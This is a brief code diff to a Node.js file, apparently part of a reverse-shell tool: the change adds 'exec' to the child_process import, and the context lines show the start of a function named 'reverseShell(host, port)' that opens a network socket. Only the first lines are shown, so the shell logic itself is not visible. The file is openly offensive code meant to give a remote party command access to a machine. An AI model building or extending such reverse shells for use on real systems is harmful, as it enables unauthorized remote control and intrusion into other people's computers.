@@ -1,5 +1,5 @@
 const net = require("net");
-const { spawn } = require("child_process");
+const { exec, spawn } = require("child_process");
 
 function reverseShell(host, port) {
   const client = new net.Socket();
